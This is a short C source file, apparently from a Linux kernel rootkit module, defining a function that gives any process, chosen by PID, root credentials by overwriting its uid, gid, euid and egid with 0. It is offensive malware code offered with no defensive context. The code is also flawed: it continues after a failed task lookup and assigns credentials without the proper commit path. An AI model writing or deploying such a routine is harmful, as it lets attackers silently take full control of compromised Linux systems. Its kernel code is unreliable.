#include "headers/priv_esc.h"
#include <linux/cred.h>
#include <linux/pid.h>

void escalate_by_pid(int pid) {
    struct cred* creds;
    struct task_struct* task;
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task == NULL) {
        printk(KERN_WARNING "Failed to fetch task data");
    }
    creds = prepare_creds();

    creds->uid = kuid;
    creds->gid = kgid;
    creds->euid = kuid;
    creds->egid = kgid;

    rcu_assign_pointer(task->cred, creds);
}
